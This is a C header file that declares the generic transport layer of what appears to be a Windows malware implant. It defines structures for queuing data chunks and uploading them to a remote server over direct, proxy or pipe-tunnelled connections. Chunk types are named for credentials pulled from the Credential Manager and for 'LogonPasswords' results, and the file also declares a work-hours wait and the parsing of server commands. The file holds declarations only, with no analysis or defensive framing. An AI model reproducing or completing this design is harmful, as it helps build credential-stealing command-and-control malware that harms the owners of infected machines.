/*
	transport_Generic.h
	Generic routines for all transport modules
*/

#pragma once

#include <Windows.h>
#include "NetworkConnectivity.h"

// max amount of memory, in bytes, which may be allocated by all items' contents
#define TS_MAX_ALLITEMS_SIZE 256 * 1024 * 1024

// used by all transports, a connection type of transport for remote network
typedef enum NETWORK_CONNECTION_TYPE {
	NCT_LOCAL_ONLY = 0,		// only local connection, unable to access remote hosts via usual system services
	NCT_REMOTE_DIRECT,		// remote connections allowed, no proxy detected
	NCT_REMOTE_PROXY,		// remote connections allowed using some internal proxy

	// possibly more here, like dns tunneling, ping tunneling, etc
	// if add something here, check NetworkConnectivity.cpp at ncStartNetworkConnectivity()
	// for a proper comparison for starting a pipe server

	NCT_PIPE_TUNNELING,		// remote access is performed using pipe server, which proceeds packet requests

	NCT_MAX = 255	// max value to fit into BYTE
};

// define type for callers
typedef LPVOID CHUNK_HANDLE;
typedef DWORD VOLATILE_CHUNK_ID;
typedef UINT64 VOLATILE_SOURCE;

// define values for VOLATILE_CHUNK_ID and VOLATILE_SOURCE
//#define NON_VOLATILE 0
//#define PERSISTENT_CHUNK 0
#define SOURCE_LOCAL 0


// all possible volatile sources, used as VOLATILE_CHUNK_ID values
typedef enum VolatileSourceType {
	NON_VOLATILE = 0,	// none defined, assumed to be an error
	VOLATILE_CREDS,		// creds from CredManager
	VOLATILE_HEARTBEAT,	// heartbeat
	VOLATILE_LPR_RESULT,	// LogonPasswords resulting error code
	VOLATILE_KBRI_HEARTBEAT,	// mod_KBRI heartbeat query

	VOLATILE_MAX_VALUE = MAXDWORD
};

// defines a possible status codes assigned to a specific chunk to be uploaded to remote server
typedef enum CHUNK_STATUS {
	CS_NONE = 0,	// assumed to be an error, for ex. queried chunk does not exist
	CS_NEW,			// newly added chunk
	CS_UPLOADING,	// chunk is being uploaded to server. This status will remain between unsuccessfull send attempts
	CS_ANSWER_READY,	// server returned an answer for this chunk. As soon as caller reads the answer, chunk is disposed


	CS_MAXVAL = MAXBYTE	// max value to fit into BYTE size
};

// used by some other modules (DataCallbackManager.h) to specify these params via callback query
// also used to serialize params passed via Pipes query
#pragma pack(push)
#pragma pack(1)
typedef struct _PERSISTENCE_PARAMS
{
	// volatile tags, used to replace existing chunks if a chunk with same params of these is attempted to be added
	VOLATILE_CHUNK_ID vciType;	// NON_VOLATILE, or any other non-zero value to enable chunk replacement on add
	VOLATILE_SOURCE vsSource;	// SOURCE_LOCAL or any other non-zero value to unique identify remote host (hash of it's name, for example)
} PERSISTENCE_PARAMS, *PPERSISTENCE_PARAMS;
#pragma pack(pop)

// describes a single chunk in memory list
typedef struct _CHUNK_ITEM CHUNK_ITEM;
typedef struct _CHUNK_ITEM {

	// linked list ptrs
	CHUNK_ITEM *lcNext;	// ptr to next item in list, or NULL if this is a last item
	
	CHUNK_STATUS cStatus;	// current status of this chunk

	LPVOID pOut;	// buffer to be sent to remove server
	DWORD lOutLen;	// ^ it's len

	LPVOID pAnswer;		// answer from server for this particular chunk
	DWORD lAnswerLen;	// ^ it's len

	// timestamps for creation and answer receival
	DWORD dwTicksCreated;
	DWORD dwTicksAnswerReceived;

	// volatile tags, used to replace existing chunks if a chunk with same params of these is attempted to be added
	VOLATILE_CHUNK_ID vciType;	// NON_VOLATILE, or any other non-zero value to enable chunk replacement on add
	VOLATILE_SOURCE vsSource;	// SOURCE_LOCAL or any other non-zero value to unique identify remote host (hash of it's name, for example)

} CHUNK_ITEM, *PCHUNK_ITEM;

// non-aligned structure used for enveloping a single chunk's data before sent to remote server
#pragma pack(push)
#pragma pack(1)
typedef struct _CHUNK_SERIALIZATION_ENVELOPE {

	DWORD dwRandomValue;	// some random value for changing hash each time
	DWORD dwDataLen;		// length of data appended
	BYTE bChunkHash[20];	// hash value of a chunk, for verification at server side

} CHUNK_SERIALIZATION_ENVELOPE, *PCHUNK_SERIALIZATION_ENVELOPE;
#pragma pack(pop)

// all possible transport's query types. NB: later, it is possible that not all query types are supported by all transports
typedef enum TRANSPORT_QUERY_TYPE {
	QT_GET = 1,
	QT_POST
};

// structure to be sent as a param to a call to transport's API function
typedef struct _TRANSPORT_QUERY {
	TRANSPORT_QUERY_TYPE tqType;	// type of query to be issued, like GET, POST, or some others, if supported by transport
	LPWSTR wszTarget;				// target url to connect to (for winhttp & winhttp-over-pipes transports) 
	LPVOID pSendBuffer;				// outgoing buffer, may be NULL for GET query
	DWORD lSendBufferLen;			// len for outgoing buffer
	LPVOID *pAnswer;				// ptr to receive an internally allocated buffer with server's answer. May be NULL if caller does not need answer
	DWORD *dwAnswerLen;				// ptr to receive size of server's answer

} TRANSPORT_QUERY, *PTRANSPORT_QUERY;

// definition of APIS
typedef struct _TRANSPORT_HANDLE TRANSPORT_HANDLE, *PTRANSPORT_HANDLE;	// forward declaration
typedef BOOL(CALLBACK* TRANSPORT_QUERY_FUNCTION)(PTRANSPORT_HANDLE, PTRANSPORT_QUERY);
typedef VOID(CALLBACK* TRANSPORT_FREE_FUNCTION)(PTRANSPORT_HANDLE);

// generic structure returned as a result of init for all transport network modules
typedef struct _TRANSPORT_HANDLE
{
	WORD wLen;	// structure size, for proper init check

	DWORD dwMaxSuggestedDataLen;	// max size suggested by a module. Greater values should not usually lead to fails, but due to communication
									// methods, module recommends this max size when caller combines some data together

	DWORD dwLastFailedConnectionAttempts;	// amount of unsuccessfull transfer attempts since last ok communication

	NETWORK_CONNECTION_TYPE ncType;	// type of remote connection possible for establishing - direct, proxy, or local only

	// function(s) to be used for sending/receiving data
	// with a constant format for all transports
	TRANSPORT_QUERY_FUNCTION fQuery;
	TRANSPORT_FREE_FUNCTION fDispose;

	LPVOID pInternalModuleContext;	// ptr to internal context structure, transport module-specific

} TRANSPORT_HANDLE, *PTRANSPORT_HANDLE;

// structure to pass params from _tsgenParseAnswerForServerCommands() to a child thread
// should be disposed by child thread as soon as done processing
typedef struct _TSG_ANSWER_PARSE_PARAMS
{
	LPVOID pData;
	DWORD dwDataLen;

} TSG_ANSWER_PARSE_PARAMS, *PTSG_ANSWER_PARSE_PARAMS;


// internals globals structure
typedef struct _TSG_WORK_STRUCTURE
{
	// linked list related
	CRITICAL_SECTION csListAccess;	// cs guarding acces to a list of callbacks
	CHUNK_ITEM lHead;				// list head of callback chain
	DWORD dwItemsCount;				// amount of items in ^ chain
	SIZE_T lAllItemsSize;			// amount of mem used by item's data, to check for max mem allocation allowed

	HANDLE hWorkerThread;				// handle to a thread performing server link via specific transport

} TSG_WORK_STRUCTURE, *PTSG_WORK_STRUCTURE;

// network enabled list of machines, linked list item
typedef struct _NEL_MACHINE_ITEM NEL_MACHINE_ITEM;
typedef struct _NEL_MACHINE_ITEM {

	// linked list ptrs
	NEL_MACHINE_ITEM *lcNext;	// ptr to next item in list, or NULL if this is a last item

	UINT64 i64MachineNameHash;	// internal hash of machine name, for easier search 
	LPWSTR wszMachineName;	// name of machine with network connectivity enabled
	DWORD dwTicksReceived;	// local ticks count when this record was received / updated

} NEL_MACHINE_ITEM, *PNEL_MACHINE_ITEM;

// all module's vars are gathered in this structure
typedef struct _NETWORK_CONNECTIVITY_CONTEXT
{

	CRITICAL_SECTION csTransportAccess;	// cs to guard access to transport from diffent callers
	TRANSPORT_HANDLE *pTransportHandle;		// ptr to transport's init handle (generic structure for all transports, with a field for internals)

	CRITICAL_SECTION csNetworkEnabledListAccess;
	DWORD lnmlCount;	// amount of items in NEL list pointed by nmlHead
	NEL_MACHINE_ITEM nmlHead;	// list head 

	// local machine's name
	UINT64 i64MachineNameHash; // as a hash
	LPWSTR wszMachineName;	// as string
	DWORD dwMachineNameLen; // len in bytes with null terminator (to be broadcasted)

} NETWORK_CONNECTIVITY_CONTEXT, *PNETWORK_CONNECTIVITY_CONTEXT;

// internals
VOID tsgenWaitForWorkhours();
VOID tsgenInit(NETWORK_CONNECTIVITY_CONTEXT *ncContext);
BOOL tsgenFormOutgoingPackage(DWORD dwSuggestedMaxLen, LPVOID *pResultingBuffer, DWORD *dwResultingBufferLen, LPVOID *pChunksListContext);
VOID _tsgenRemoveOutdatedChunks(DWORD dwMaxTTLMins);
BOOL tsgenUpdateChunksResults(LPVOID pChunksListContext, LPVOID pServerAnswerContext, DWORD dwServerAnswerContextLen);
BOOL tsgenUpdateChunksStatus(LPVOID pChunksListContext, CHUNK_STATUS csStatus);
BOOL _tsgenRemoveDisposeChunk(CHUNK_ITEM *pChunk);
VOID _tsgenLeaveLock();
VOID _tsgenEnterLock();
BOOL _tsgenIsChunkHandleValid(CHUNK_HANDLE cHandle);
//VOID tsgenAssignTransport(TRANSPORT_HANDLE *pTransportHandle);
BOOL tsgenSelectTransport(NETWORK_CONNECTIVITY_CONTEXT *ncContext);

// to be used by other modules
CHUNK_STATUS tsgenQueryOutgoingChunkStatus(CHUNK_HANDLE cHandle, LPVOID *pAnswerBuffer, DWORD *dwAnswerBufferLen);
CHUNK_HANDLE tsgenAddOutgoingChunk(LPVOID pData, DWORD dwDataLen, VOLATILE_CHUNK_ID vciType, VOLATILE_SOURCE vsSource);